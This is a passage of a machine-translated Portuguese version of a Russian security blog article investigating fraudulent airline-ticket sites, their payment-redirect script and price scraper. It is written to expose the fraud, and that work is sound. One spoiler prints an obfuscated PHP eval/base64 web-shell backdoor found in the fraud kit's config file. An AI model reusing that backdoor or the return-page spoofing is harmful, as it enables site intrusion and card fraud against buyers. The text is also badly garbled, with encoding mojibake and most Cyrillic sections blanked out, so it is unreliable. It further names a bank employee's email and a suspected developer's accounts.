<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mais tarde, durante o teste, foi decidido desativar os redirecionamentos na fase final no payp2p.php. Depois disso, tornou-se poss√≠vel ler a mensagem de erro do Promsvyazbank. Captura de tela do erro abaixo. No navegador, ap√≥s uma tentativa mal sucedida de efetuar um pagamento, outra p√°gina √© exibida, mas se voc√™ clicar em "Voltar" uma ou mais vezes, poder√° ver esta p√°gina.</font></font><br>
<br>
<img src="https://habrastorage.org/files/11f/86c/ecd/11f86cecd02b46828d04419e18f8354b.png"><br>
<blockquote>: <br>
<br>
,         . <br>
<br>
  : /   (/)<br>
,       ,    / </blockquote><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Existem algumas restri√ß√µes no n√∫mero de pagamentos de um cart√£o por dia no site do Promsvyazyazbank, etc. Embora eu n√£o tenha excedido os limites no n√∫mero de pagamentos reais, √© poss√≠vel que os pagamentos n√£o tenham sido processados ‚Äã‚Äãem algum momento, devido ao grande n√∫mero de minhas tentativas. (Para capturar os valores das vari√°veis ‚Äã‚Äãdurante a depura√ß√£o, iniciei o processo de pagamento v√°rias vezes, mas n√£o o finalizei) N√£o sei o motivo exato dessa mensagem. Cada tentativa de pagamento de ORDER_NUM e TIMESTAMP usa uma nova. Eles n√£o deveriam ter influenciado a apar√™ncia de tal erro. Embora o cart√£o que eu usei para pagamento, um pagamento bem-sucedido tenha passado por um script payment.php alternativo, talvez o cart√£o do remetente ou do destinat√°rio tenha entrado na lista de espera.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
O script payp2p.php j√° era um pouco parecido com o estado original. Eu mesmo comecei a ficar confuso sobre o que substitu√≠ e o que n√£o substitui. Portanto, retornei √† sua forma original, exceto que nas √∫ltimas linhas o redirecionamento do redirecionamento para a p√°gina de pagamento bem-sucedido foi desativado. Os n√∫meros dos cart√µes do remetente e do destinat√°rio para as tentativas subseq√ºentes foram usados ‚Äã‚Äãde novo. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Por fim, com a ajuda do payp2p.php, ocorreu um pagamento bem-sucedido. </font></font><br>
<br>
<img src="https://habrastorage.org/files/9cd/606/539/9cd60653958e4dda9fa38ef0e9826092.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Preste aten√ß√£o √† assinatura na linha "Descri√ß√£o". </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ap√≥s inserir o c√≥digo de confirma√ß√£o 3D Secure, o retorno √© feito na p√°gina Promsvyazbak: </font></font><br>
<br>
<img src="https://habrastorage.org/files/fed/cb7/370/fedcb7370bcb4995a20a9a7218c6bdbc.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
SMS recebido. √Ä esquerda do banco do remetente. √Ä direita do banco do benefici√°rio. </font></font><br>
<br>
<img src="https://habrastorage.org/files/463/935/875/46393587535a428384fc62522d5154ff.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
O Sberbank, por algum motivo, indicado no hor√°rio GMT por SMS. Anteriormente, eu n√£o percebi isso nas mensagens deste banco.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Com a substitui√ß√£o da p√°gina de retorno desativada, repita o pagamento com sucesso usando o script payp2.php que foi exibido v√°rias vezes. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Eu tentei pagar com outros cart√µes. Cada banco emite seu formul√°rio 3D Secure. Mas isso n√£o muda a ess√™ncia. </font></font><br>
<br>
<img src="https://habrastorage.org/files/452/684/b75/452684b75ede43deaca4c3c448d77bf5.png"><br>
<br>
<img src="https://habrastorage.org/files/671/19c/d9f/67119cd9f13b4b1b92c43903c4a5a466.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Observe que nem todos os bancos incluem uma "descri√ß√£o adicional" em seu formul√°rio de confirma√ß√£o. No nosso exemplo, "bilhete pago".</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
N√£o √© necess√°rio se adaptar √† p√°gina de cada banco. Embora as formas sejam diferentes, o mecanismo de substitui√ß√£o delas √© o mesmo. Qualquer formul√°rio ap√≥s o pagamento cont√©m um link com o endere√ßo da p√°gina para a qual voc√™ deseja retornar. Os pr√≥prios bancos, que fornecem formul√°rios de verifica√ß√£o 3D Secure, provavelmente n√£o ser√£o devolvidos ao "site esquerdo". Certamente, existem algumas regras e os bancos do formul√°rio de verifica√ß√£o do 3DS devem retornar pelo menos ao mesmo dom√≠nio do qual a solicita√ß√£o de pagamento foi recebida. (No nosso caso, em 3ds.payment.ru). O banco que verifica o c√≥digo 3D Secure, caso a senha seja digitada corretamente, no c√≥digo html da p√°gina indica o endere√ßo para o qual √© necess√°rio retornar, mas n√£o pode mais controlar se deveria retornar a esta p√°gina.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Como resultado de todas as experi√™ncias, foi poss√≠vel obter o script payp2p.php atrav√©s do servi√ßo de transfer√™ncia de cart√£o para cart√£o do Promsvyazbank 3ds.payment.ru. Ao mesmo tempo, tive que desativar a substitui√ß√£o do endere√ßo de retorno nas √∫ltimas linhas do script. Quando voc√™ ativa a falsifica√ß√£o do endere√ßo da p√°gina de retorno, como estava no script original, atualmente o dinheiro n√£o passa. A p√°gina de verifica√ß√£o do 3D Secure √© exibida; SMS com "senha" √© enviado; o formul√°rio de verifica√ß√£o n√£o pula para a pr√≥xima etapa ao inserir a senha incorreta; depois de inserir a "senha" correta, redireciona para uma p√°gina falsa, mas o dinheiro n√£o passa.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
A falsifica√ß√£o do endere√ßo da p√°gina de retorno para o pagamento bem-sucedido √© uma parte muito importante para sites fraudulentos. Se o "comprador de passagens a√©reas" n√£o suspeitar que foi enganado, ele poder√° pagar n√£o apenas uma, mas v√°rias compras de passagens e, depois disso, por um longo per√≠odo (dias e semanas), n√£o tomar√° nenhuma a√ß√£o ativa para cancelar o pagamento, etc. Se o comprador depois de "pagar as passagens a√©reas" receber a confirma√ß√£o da transfer√™ncia de cart√£o para cart√£o, provavelmente n√£o far√° mais os pagamentos a seguir, entrar√° em contato com o banco e, possivelmente, com a pol√≠cia muito mais rapidamente. Isso significa que os fluxos de caixa em sites fraudulentos s√£o reduzidos, aumenta a probabilidade de cancelar pagamentos anteriores, as ag√™ncias policiais e os funcion√°rios anfitri√µes come√ßam a agir mais cedo, e aumenta a probabilidade de n√£o ter tempo para retirar fundos roubados para um local seguro.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
O fato de esse script ter sido usado em um site fraudulento de combate, n√£o tenho d√∫vidas. Tenho motivos para acreditar que funcionou da forma em que foi fornecido a mim. Atualmente, ele funciona limitado (sem redirecionamentos).</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Cerca de tr√™s semanas ap√≥s a publica√ß√£o da primeira parte da publica√ß√£o, que mencionava fraudadores usando o servi√ßo de transfer√™ncia cart√£o a cart√£o do Promsvyazbank, esse banco fez algumas altera√ß√µes em seu servi√ßo, o que considero importante. Antes, ao pagar pelo site do Promsvyazbank, os pagadores recebiam SMS incompreens√≠vel com o texto "P2P PSBANK", mas agora come√ßaram a receber SMS com o texto "CARD2CARD PSBANK.RU". Mesmo assim, √† primeira vista, uma pequena altera√ß√£o na descriptografia da finalidade do pagamento √© suficiente para que algumas das poss√≠veis v√≠timas de fraudadores cancelem o pagamento na fase de confirma√ß√£o. Eu acho que isso n√£o √© uma coincid√™ncia, e as mudan√ßas foram feitas precisamente como resultado da publica√ß√£o do artigo no GeekTimes.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
√â prov√°vel que, ap√≥s a publica√ß√£o da primeira parte do artigo, juntamente com a altera√ß√£o do texto de confirma√ß√£o no SMS, ajustes adicionais possam ser feitos nos algoritmos do servi√ßo de transfer√™ncia de cart√£o para cart√£o do Promsvyazbank. </font></font><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">N√£o posso dizer 100%, mas minha opini√£o √© que antes do servi√ßo do Promsvyazbank 3ds.payment.ru com uma alta probabilidade n√£o verificava o retorno dos usu√°rios ao site depois de inserir com √™xito o c√≥digo 3D Secure nos sites dos bancos que emitem cart√µes. Portanto, os pagamentos foram processados ‚Äã‚Äãmesmo quando scripts fraudulentos alteraram a p√°gina de retorno.</font></font></b><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
O banco, mencionado muitas vezes nesta publica√ß√£o, teve sorte com publicidade gratuita. Penso que, na realidade, ainda existe um n√∫mero suficiente desses bancos. S√≥ que isso √© mais feliz porque foi escolhido primeiro para uso em sites fraudulentos e depois para an√°lise neste artigo. Como se costuma dizer, n√£o h√° pacientes saud√°veis, h√° pacientes mal examinados. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ao escrever este artigo, a tarefa de criar um script fraudulento de combate n√£o valeu a pena. A tarefa era tentar entender como isso funciona ou funcionou, a fim de entender os motivos pelos quais os "compradores de passagens a√©reas" poderiam ser enganados e tirar conclus√µes disso.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Este artigo levanta muitas perguntas, mas n√£o fornece todas as respostas. </font><font style="vertical-align: inherit;">Estou certo de que entre os leitores haver√° um n√∫mero suficiente de usu√°rios avan√ßados que poder√£o comentar com mais precis√£o o quadro cl√≠nico e fazer um diagn√≥stico. </font><font style="vertical-align: inherit;">Pela minha parte, tentei apresentar o testemunho o mais completamente poss√≠vel ... </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Parte da publica√ß√£o com a an√°lise do script de pagamento est√° conclu√≠da. </font><font style="vertical-align: inherit;">B√¥nus adicionais para aqueles que puderam ler neste local.</font></font><br>
<hr><br>
<b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">De onde vem a passagem a√©rea barata em sites fraudulentos? </font></font></b><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Na parte anterior da publica√ß√£o, por sinais indiretos, foi demonstrado que informa√ß√µes sobre a disponibilidade de locais e pre√ßos s√£o obtidas de forma program√°tica em algum site honesto, modificado e emitido para o usu√°rio.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Exemplo de informa√ß√µes sobre disponibilidade e pre√ßos em um site fraudulento</font></font></b><div class="spoiler_text"><img src="https://habrastorage.org/files/7a5/1e4/8a8/7a51e48a8a3d4d8aabb8ea4acdbd053e.jpg"><br>
</div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Agora temos a oportunidade de olhar nos bastidores e ver como isso √© implementado no c√≥digo do programa. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Aqui √© o local no c√≥digo do site fraudulento no qual vemos de onde v√™m as fotos e os pre√ßos dos voos de sites fraudulentos. </font></font><br>
<br>
<img src="https://habrastorage.org/files/e65/0c5/25b/e650c525b0424acf861678766f7eb75c.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Como esperado nesta s√©rie de sites fraudulentos, as informa√ß√µes sobre lugares dispon√≠veis s√£o obtidas em um site honesto </font></font><code>www.aviacassa.ru</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">. Como o n√∫mero de companhias a√©reas e v√¥os √© grande, √© muito dif√≠cil fazer o download antecipado de todas as imagens e √≠cones em tal problema; os links para essas imagens s√£o deixados diretamente no site original. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
O desconto √© deduzido do pre√ßo original recebido pelas passagens a√©reas. Como mostrado anteriormente, o propriet√°rio de um site fraudulento pode definir arbitrariamente o valor do desconto. O valor do desconto √© armazenado no arquivo aviacfg.php.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Um c√≥digo mais completo respons√°vel por obter informa√ß√µes sobre a disponibilidade de assentos, preparar links para fotos e alterar pre√ßos sob o spoiler.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Analisador de pre√ßo - uma parte mais completa do c√≥digo</font></font></b><div class="spoiler_text"><img src="https://habrastorage.org/files/cf0/e74/617/cf0e7461727a4415bf018283c1cdf15c.png"><br>
</div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
N√£o desmontaremos essa pe√ßa linha por linha, pois n√£o √© o c√≥digo em si que √© importante, mas a id√©ia de como e de onde v√™m os dados reais de passagens a√©reas para sites fraudulentos. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
O analisador antigo usou outro site para obter dados: </font></font><br>
<br>
<img src="https://habrastorage.org/files/e7e/625/9d8/e7e6259d8cc84a1586e61e7005ac6d3f.png"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Dica para a bilheteria </font></font><code>(www.aviacassa.ru)</code><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">- voc√™ precisa fechar a possibilidade de links para arquivos de dom√≠nio de um referenciador externo (site de refer√™ncia). </font><font style="vertical-align: inherit;">Essa oportunidade pode ser fechada para todos, sem exce√ß√£o, ou voc√™ pode fazer exce√ß√µes apenas para parceiros confi√°veis. </font><font style="vertical-align: inherit;">O servidor da web NGINX, que usa aviacassa, facilita isso. </font><font style="vertical-align: inherit;">A mesma recomenda√ß√£o para todos os sites semelhantes que podem ser usados ‚Äã‚Äãcomo "doadores de informa√ß√µes".</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Se sites fraudulentos n√£o puderem vincular diretamente a imagens em sites como bilheterias, isso complicar√° sua vida. O n√∫mero de logotipos e imagens de v√°rias companhias a√©reas n√£o √© conhecido antecipadamente. Mesmo se voc√™ tentar baixar as fotos com anteced√™ncia, poder√° pular alguma coisa e o site fraudulento ficar√° feio. Esses sites ser√£o for√ßados a baixar todas as imagens localmente no servidor a cada solicita√ß√£o ou, pelo menos, verificar se essa imagem foi baixada anteriormente no "cache" ou n√£o. Isso aumenta a carga no servidor de fraude e torna a renderiza√ß√£o da p√°gina mais lenta. Al√©m disso, o fechamento da capacidade de vincular diretamente as imagens ao mesmo tempo tornar√° todos os sites fraudulentos atuais que usam as informa√ß√µes da bilheteria inoperantes.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Obviamente, com o tempo, os desenvolvedores far√£o corre√ß√µes. </font><font style="vertical-align: inherit;">Por√©m, como sites fraudulentos n√£o s√£o gerenciados centralmente e v√°rias pessoas n√£o t√™m atualiza√ß√µes autom√°ticas de software, cada propriet√°rio de um site fraudulento precisar√° procurar uma oportunidade para atualizar. </font><font style="vertical-align: inherit;">Algu√©m encontrar√° o c√≥digo atualizado, mas algu√©m n√£o o encontrar√° e o site deixar√° de funcionar. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Al√©m disso, a bilheteria pode incluir um registro separado para essas imagens, no qual os registros sobre todos os referenciadores externos (sites de refer√™ncia) ser√£o salvos. </font><font style="vertical-align: inherit;">E em alguns dias nesse log, voc√™ obter√° uma lista de todos os sites fraudulentos ativos. </font><font style="vertical-align: inherit;">√â muito conveniente - em vez de tentar encontrar cada site individualmente, voc√™ pode solicitar que eles se registrem independentemente na lista (arquivo de log).</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">E se houver administradores engra√ßados na bilheteria, voc√™ pode fazer uma piada ...</font></font></b><div class="spoiler_text"> - NGINX           ,    ,  ¬´¬ª        ,         URL ,   .     .   ‚Äî   ¬´ ¬ª   ,        -, ,  ,       ,     .</div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Algu√©m pode dizer que a publica√ß√£o de tais artigos serve como uma ferramenta de treinamento para golpistas e fazer uma pergunta: por que eu a publiquei aqui? Eu respondo. Se existe alguma maneira de roubar dinheiro, com base no uso de software vulner√°vel ou insuficientemente protegido, sobre o qual pelo menos algumas pessoas sabem e seu objetivo √© ganhar dinheiro com isso, uma tentativa de ocultar essas informa√ß√µes e fingir que n√£o h√° problemas leva apenas a consequ√™ncias ainda piores. Os fraudadores usam esses m√©todos ainda mais ativamente, enquanto os bancos ficam satisfeitos porque pagam regularmente a comiss√£o pelos servi√ßos e roubam dinheiro deles. Por que os bancos precisam mudar alguma coisa, se tudo √© t√£o bom? De tempos em tempos, apenas alguns usu√°rios da Internet s√£o enganados e perdem dinheiro em sites fraudulentos. Mas quem se importa?</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Minha opini√£o √© que, se alguma oportunidade "complicada" de roubar dinheiro for conhecida por um n√∫mero muito grande de pessoas, com o tempo, torna-se muito mais dif√≠cil para os fraudadores us√°-lo, e torna-se imposs√≠vel para as organiza√ß√µes que o usam ignorarem problemas. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
O script payp2.php e v√°rios arquivos usados ‚Äã‚Äãem uma s√©rie recente de sites fraudulentos de vendas de companhias a√©reas foram enviados a mim pelo usu√°rio </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=" class="user_link"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">frozenstorm</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . N√£o sei onde ele conseguiu - encaminhe diretamente a ele todas as perguntas sobre esse assunto.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mas posso dizer imediatamente que, como se viu depois, n√£o √© dif√≠cil encontrar o conjunto completo de c√≥digos-fonte para sites fraudulentos que vendem passagens a√©reas. </font><font style="vertical-align: inherit;">Pesquisou "voos falsos". </font><font style="vertical-align: inherit;">Os dois principais mecanismos de pesquisa fornecem links na primeira p√°gina. </font><font style="vertical-align: inherit;">Um conjunto completo de c√≥digos-fonte custa apenas 25 a 30 toneladas de rublos. </font><font style="vertical-align: inherit;">Depois que esse t√≥pico parou de funcionar, os c√≥digos-fonte n√£o funcionais, que, segundo o vendedor, s√£o "f√°ceis de terminar", come√ßaram a custar 10 tr. </font><font style="vertical-align: inherit;">Recentemente, a julgar pelas mensagens nos f√≥runs, a vers√£o 2.0 supostamente est√° √† venda novamente a um pre√ßo de 25tr. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Abaixo est√° um exemplo de spoiler da venda gratuita do c√≥digo fonte de um site fraudulento para a venda de passagens a√©reas em um dos f√≥runs.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Captura de tela do f√≥rum. </font><font style="vertical-align: inherit;">(Fotos legais e muito longas)</font></font></b><div class="spoiler_text"><img src="https://habrastorage.org/files/7bc/69f/693/7bc69f6935294a76ba54c22e6fc2376f.jpg"><br>
<div class="spoiler"><b class="spoiler_title"> .  (2/5)</b><div class="spoiler_text"><img src="https://habrastorage.org/files/823/4a0/f64/8234a0f641be4ef1a1acfe4fe4c8c7b4.jpg"><br>
</div></div><br>
<div class="spoiler"><b class="spoiler_title"> .  (3/5)</b><div class="spoiler_text"><img src="https://habrastorage.org/files/147/0d7/d85/1470d7d857c2462c9a8948a64348d13e.jpg"><br>
</div></div><br>
<div class="spoiler"><b class="spoiler_title"> .  (4/5)</b><div class="spoiler_text"><img src="https://habrastorage.org/files/743/5ad/aef/7435adaef04748b987b38b5cac75590a.jpg"><br>
</div></div><br>
<div class="spoiler"><b class="spoiler_title"> .  (5/5)</b><div class="spoiler_text"><img src="https://habrastorage.org/files/1a1/519/eb6/1a1519eb638949be87239514e44edec9.jpg"><br>
</div></div><br>
</div></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
No f√≥rum, mostrado na captura de tela, c√≥digos de sites fraudulentos semelhantes, informa√ß√µes de cart√£o de cr√©dito, dados de passaporte, informa√ß√µes pessoais de bancos de dados estaduais s√£o vendidos e comprados abertamente, prop√µe-se a cria√ß√£o de passaportes falsos, carteiras de motorista etc. Esta √© apenas uma pequena lista, por exemplo. I.e. com raras exce√ß√µes, h√° crime cont√≠nuo. Ao mesmo tempo, a administra√ß√£o do f√≥rum atua como garante entre compradores e vendedores. Existem v√°rios f√≥runs como este. Todos eles trabalham livremente por anos. Todos eles s√£o perfeitamente indexados pelos mecanismos de pesquisa (Yandex, Google, etc.). N√£o cito o endere√ßo de um f√≥rum espec√≠fico. Eles s√£o muito f√°ceis de encontrar.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Como atr√°s de cada site fraudulento para a venda de passagens a√©reas h√° uma pessoa separada que comprou o c√≥digo-fonte do site por baixo custo, em cada caso, voc√™ pode encontrar a pessoa respons√°vel e isso deve ser feito. Nem todo administrador de um site falso √© um super profissional cujos tra√ßos n√£o podem ser encontrados. Estou certo de que, entre esses administradores, h√° um n√∫mero suficiente de pessoas que herdaram e, se tiverem a autoridade apropriada, podem ser calculadas. Mas, na minha opini√£o, em vez de tentar lidar com cada site falso individualmente, voc√™ deve prestar aten√ß√£o nos sites em que as fontes desses sites falsos s√£o distribu√≠das livremente.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Para infligir um golpe esmagador em sites fraudulentos que vendem passagens a√©reas falsas, voc√™ n√£o precisa de muito. Se todo mundo fizer um pouco, isso complicar√° bastante a vida dos fraudadores e poder√° levantar a quest√£o da inefici√™ncia de conduzir um neg√≥cio desses. √â preciso um pouco de aten√ß√£o dos mecanismos de pesquisa - para impedir que esses sites entrem em an√∫ncios. N√£o √© realista dividir esses sites nos principais resultados sem publicidade. Al√©m disso, os mecanismos de pesquisa devem excluir sites que realmente compram e vendem esquemas criminais. √â preciso pouca aten√ß√£o dos bancos para acompanhar seus servi√ßos de pagamento, para que os fraudadores n√£o possam us√°-los facilmente. Precisa de um pouco de aten√ß√£o dos hosters. Voc√™ precisa de um pouco de aten√ß√£o dos sistemas de pagamento. Para come√ßar, n√£o permita pagamentos sem verificar o 3D Secure (como mostrado na primeira parte da publica√ß√£o,ainda √© poss√≠vel). Precisa de alguma aten√ß√£o da aplica√ß√£o da lei. Em vez de investigar todos os casos de roubo de dinheiro, √© mais eficiente agir com anteced√™ncia - lidar com o ninho onde os golpistas se comunicam (analise, por exemplo, aqueles f√≥runs muito sombrios). E √© claro que voc√™ precisa de um pouco de aten√ß√£o dos potenciais compradores de passagens a√©reas.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Eles dizem que os reparos n√£o podem ser conclu√≠dos e s√≥ podem ser interrompidos. </font><font style="vertical-align: inherit;">Esta publica√ß√£o √© um caso semelhante. </font><font style="vertical-align: inherit;">Portanto, embora muito mais possa ser escrito, vou parar por aqui. </font><font style="vertical-align: inherit;">Obrigado pela aten√ß√£o. </font><font style="vertical-align: inherit;">Ficarei feliz em seus coment√°rios.</font></font><br>
<br>
<div class="spoiler"><b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PS Sobre Jackie Chan ... Voc√™ n√£o pode ler</font></font></b><div class="spoiler_text">      ,       ,           ,    ,      .<br>
<br>
          ,       , ,   ,     - .      .        .<br>
<br>
<div class="spoiler"><b class="spoiler_title"> </b><div class="spoiler_text">   fon.png.    ,   ,  .    (merch)    .    .<br>
<br>
           . , -      ,    .    .        .<br>
<img src="https://habrastorage.org/files/d79/ff7/9c4/d79ff79c458d4bd9ad5c15987f410a8b.png"><br>
<br>
         VISA  Mastercard     (logo_standart_ru.png):<br>
<br>
<img src="https://habrastorage.org/files/596/f44/183/596f4418373846908dcede64835821c4.png"><br>
<br>
    .   , .<br>
</div></div><br>
<div class="spoiler"><b class="spoiler_title">       parser.php</b><div class="spoiler_text"><img src="https://habrastorage.org/files/0a9/dd4/b36/0a9dd4b36e6b45ed9aa6f5584dc2adec.png"><br>
<br>
     .<br>
</div></div><br>
<div class="spoiler"><b class="spoiler_title">  </b><div class="spoiler_text">    ,   ,   ,    - . ,    -,      ¬´¬ª .  (config.php)     ,  .                .     .     .          .<br>
<br>
<img src="https://habrastorage.org/files/65d/4e6/484/65d4e6484eca40468fdab34568130804.png"><br>
<br>
<pre><code class="php hljs"><span class="hljs-string"><span class="hljs-string">'.@evalbase64_dec&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;#111;deDQppZihpc3NldCgkX1JFUVVFU1RbImRsZV9leGVjIl0pKXsNCglAZXZhbCgkX1JFUVVFU1RbImRsZV9leGVjIl0pOw0KCWV4aXQ7DQp9LyoqLw0K.//456'</span></span> =&gt; <span class="hljs-string"><span class="hljs-string">'qwe'</span></span>,<font></font>
<font></font>
<span class="hljs-string"><span class="hljs-string">'.@evalbase64_dec&amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;amp;#111;deDQppZihpc3NldCgkX1JFUVVFU1RbImRsZV9leGVjIl0pKXsNCglAZXZhbCgkX1JFUVVFU1RbImRsZV9leGVjIl0pOw0KCWV4aXQ7DQp9LyoqLw0K.//456'</span></span> =&gt; <span class="hljs-string"><span class="hljs-string">'qwe'</span></span>,
</code></pre></div></div><br>
<div class="spoiler"><b class="spoiler_title"> .       </b><div class="spoiler_text"><img src="https://habrastorage.org/files/d28/976/6b8/d289766b88b640119c267f7721f8be25.png"><br>
<br>
     ,      ,  ,  ¬´¬ª      .<br>
</div></div><br>
<div class="spoiler"><b class="spoiler_title">     email  </b><div class="spoiler_text">     ,  EMAIL.  :<br>
<br>
<img src="https://habrastorage.org/files/8f5/996/3a5/8f59963a5d8c493aa4a38a90c911b92b.png"> <br>
       3ds.payment.ru       <code>Lakhtin@psbank.ru</code>.<br>
<br>
 ,      ? ,    - . , ,     Mastercard     3DS.<br>
<br>
<code>https://www.mastercard.us/content/dam/mccom/en-us/documents/SecureCode%20Vendor%20list/3ds-vendor-list-042215.pdf</code><br>
<br>
<div class="spoiler"><b class="spoiler_title">         Mastercard</b><div class="spoiler_text"><img src="https://habrastorage.org/files/568/5a5/70f/5685a570faf943c191ab61e9927b5e17.png"><br>
</div></div><br>
 email            .      -      .      -         . ..  - ,      ,     ,      - .<br>
<br>
  ,   email      ?     . ,  -,        .          ,     .            .     ,           ,   -   -   ,     ,      .<br>
<br>
          . , - -   email    .  ,   ,              .   ,       .   ,    ,        ,           .       -  , ,   ,  email  -,    -           . (,       ,    ..     ).      ,     .. .     .  ,          -,      .  ,       ,      ,      ,    .          .     ,     -, ,           .         , ,   ,     ,     . <br>
<br>
       ?         ,     .  email  , , .     .   -  ,     -   ,        .</div></div><br>
<div class="spoiler"><b class="spoiler_title">   ?</b><div class="spoiler_text">    ,     , ¬´¬ª   3ds.payment.ru,    .    ,          LaravelRUS    ,      Curl   3ds.payment.ru. <br>
<br>
     ,      .       ?   ?  ?<br>
 ,          ,     .<br>
<br>
<img src="https://habrastorage.org/files/51b/341/bd4/51b341bd4e9143a3b9c41fbf5288e33e.png"><br>
<br>
<img src="https://habrastorage.org/files/aac/503/90c/aac50390ca644df2a8ce9de00bc2425a.png"><br>
<br>
<img src="https://habrastorage.org/files/5e0/1f8/d30/5e01f8d302c14d229d64f7b0b52a2112.png"><br>
<br>
      .   . -    .<br>
<br>
<img src="https://habrastorage.org/files/8ee/d73/b76/8eed73b765f94a1ba8de070278a3d8df.png"><br>
<br>
 :<br>
<br>
¬ª <code>https://gitter.im/LaravelRUS/chat/archives/2016/05/06</code> ‚Äî      .       .<br>
¬ª <code>http://gitchat.org/developers/Valtas</code> ‚Äî     <br>
¬ª <code>https://github.com/Valtas</code> ‚Äî    Github<br>
¬ª <code>https://www.fl.ru/tu/57770/parser-internet-magazina.html -   .</code><br>
<br>
       ,  ,     ‚Äî      .<br>
</div></div><br>
<div class="spoiler"><b class="spoiler_title">      </b><div class="spoiler_text">  ,        .       ,      .          ,   .<br>
<br>
<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=pt&amp;u=">http://forum.prootzyvy.org/forums/spisok-sajtov-moshennikov-po-prodazhe-aviabiletov.134/</a><br>
<br>
    336 .           ,     .      .<br>
<br>
<div class="spoiler"><b class="spoiler_title">        </b><div class="spoiler_text"><img src="https://habrastorage.org/files/ca0/31e/669/ca031e669c344a2fad4af30380977d80.png"><br>
</div></div><br>
        ?   ,     .   .    ,   .                  ,  ,  ,    ..      ,    .        ,   ,     .   ,     -   ¬´ ¬ª         .     (     ).     - 5-10-20     ..   ,   ,        ,    .    (),  ,    ,     .<br>
</div></div><br>
<div class="spoiler"><b class="spoiler_title">.     ?</b><div class="spoiler_text">               .        .           ,     .      ,      .          ¬´.  ¬ª.    ,                 .      ,            .               .   .         .<br>
<br>
       ,        ,   . ,   ,      -,        .    ,     .    ,   ,          . <br>
<br>
       ,     .    ,       . ,              .<br>
</div></div><br>
<div class="spoiler"><b class="spoiler_title"> </b><div class="spoiler_text">         ,             ,           .     -   -     .       .       ,    .<br>
<br>
<img src="https://habrastorage.org/files/cfb/9df/65c/cfb9df65c6d34e2ea70ee2d078901119.png"><br>
<br>
  80   ,          .    ,    .        ,  .     :<br>
<br>
